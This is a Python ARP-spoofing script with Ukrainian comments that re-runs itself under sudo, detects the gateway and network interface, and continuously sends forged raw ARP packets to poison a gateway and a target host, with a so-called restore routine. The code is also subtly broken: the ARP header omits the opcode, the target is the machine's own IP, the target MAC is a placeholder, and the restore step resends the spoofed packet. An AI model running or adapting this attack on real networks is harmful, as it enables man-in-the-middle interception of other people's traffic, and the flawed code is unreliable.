import socket
import struct
import os
import time
import sys
import netifaces  # Для отримання доступних мережевих інтерфейсів

# Перевірка, чи запущена програма з правами root
def check_root():
    if os.geteuid() != 0:
        print("[*] Необхідно запускати програму з правами адміністратора!")
        print("[*] Автоматично перезапускаємо програму з правами адміністратора...")
        # Перезапускаємо програму з правами root
        os.execvp('sudo', ['sudo', 'python3'] + sys.argv)
        sys.exit()

# Функція для отримання локальної IP-адреси
def get_local_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(0)
    try:
        # Підключаємося до відомого адреса (Google DNS)
        s.connect(('10.254.254.254', 1))
        local_ip = s.getsockname()[0]
    except Exception:
        local_ip = '127.0.0.1'  # Якщо не вдалося знайти IP, використовуємо localhost
    finally:
        s.close()
    return local_ip

# Функція для отримання шлюзу за допомогою команди "ip route" (Linux)
def get_gateway_ip():
    try:
        # Використовуємо команду "ip route" для отримання шлюзу
        result = os.popen('ip route | grep default').read()
        gateway_ip = result.split()[2]
    except Exception:
        gateway_ip = None
    return gateway_ip

# Функція для автоматичного визначення активного мережевого інтерфейсу
def get_network_interface():
    interfaces = netifaces.interfaces()
    for iface in interfaces:
        try:
            # Перевіряємо чи інтерфейс має IP-адресу
            if iface != 'lo':  # Пропускаємо loopback інтерфейс
                iface_info = netifaces.ifaddresses(iface)
                if netifaces.AF_INET in iface_info:
                    return iface
        except Exception:
            continue
    return None

# Функція для створення ARP пакету
def create_arp_packet(target_ip, spoof_ip, target_mac):
    ether_header = struct.pack(
        '!6s6s2s', 
        bytes.fromhex('ffffffffffff'),  # МАС-адреса призначення (broadcast)
        bytes.fromhex(target_mac.replace(':', '')),  # МАС-адреса джерела
        b'\x08\x06'  # Тип Ethernet (ARP)
    )
    
    arp_header = struct.pack(
        '!2s2s1s1s6s4s6s4s', 
        b'\x00\x01',  # Апаратура Ethernet
        b'\x08\x00',  # Протокол IPv4
        b'\x06',      # Довжина адреси
        b'\x04',      # Довжина IP адреси
        bytes.fromhex(target_mac.replace(':', '')),  # МАС-адреса джерела
        socket.inet_aton(spoof_ip),  # IP-адреса джерела
        bytes.fromhex(target_mac.replace(':', '')),  # МАС-адреса призначення
        socket.inet_aton(target_ip)  # IP-адреса призначення
    )
    
    return ether_header + arp_header

# Функція для відправки ARP пакету
def send_arp_packet(packet, interface):
    with socket.socket(socket.AF_PACKET, socket.SOCK_RAW) as s:
        s.bind((interface, 0))  # Використовуємо динамічно знайдений інтерфейс
        s.send(packet)

# Функція для виконання ARP спуфінгу
def spoof(target_ip, spoof_ip, target_mac, interface):
    packet = create_arp_packet(target_ip, spoof_ip, target_mac)
    send_arp_packet(packet, interface)

# Функція для відновлення мережі
def restore_network(target_ip, gateway_ip, target_mac, interface):
    print("[*] Restoring network...")
    # Відправимо правильний ARP пакет для відновлення зв'язку
    packet = create_arp_packet(target_ip, gateway_ip, target_mac)
    send_arp_packet(packet, interface)

# Головна функція
def main():
    # Перевірка прав доступу
    check_root()

    # Отримуємо локальну IP-адресу
    target_ip = get_local_ip()
    if not target_ip:
        print("Unable to find local IP address.")
        return
    
    print(f"Local IP: {target_ip}")
    
    # Отримуємо IP шлюзу
    gateway_ip = get_gateway_ip()
    if not gateway_ip:
        print("Unable to find gateway IP.")
        return
    
    print(f"Gateway IP: {gateway_ip}")
    
    # Отримуємо MAC-адресу цільового пристрою
    target_mac = '00:11:22:33:44:55'  # Потрібно отримати або налаштувати відповідну адресу

    # Отримуємо активний мережевий інтерфейс
    interface = get_network_interface()
    if not interface:
        print("[*] Не вдалося знайти мережевий інтерфейс.")
        return
    
    print(f"Using interface: {interface}")
    
    print("[*] Starting ARP Spoofing...")
    print("[*] Якщо хочете перервати процедуру, натисніть Ctrl + C.")
    
    try:
        while True:
            spoof(target_ip, gateway_ip, target_mac, interface)  # Спуфимо шлюз для цільового пристрою
            spoof(gateway_ip, target_ip, target_mac, interface)  # Спуфимо цільовий пристрій для шлюзу
            time.sleep(2)  # Інтервал між пакетами
    except KeyboardInterrupt:
        print("[*] ARP Spoofing interrupted.")
        restore_network(target_ip, gateway_ip, target_mac, interface)  # Відновимо мережу після завершення

if __name__ == "__main__":
    main()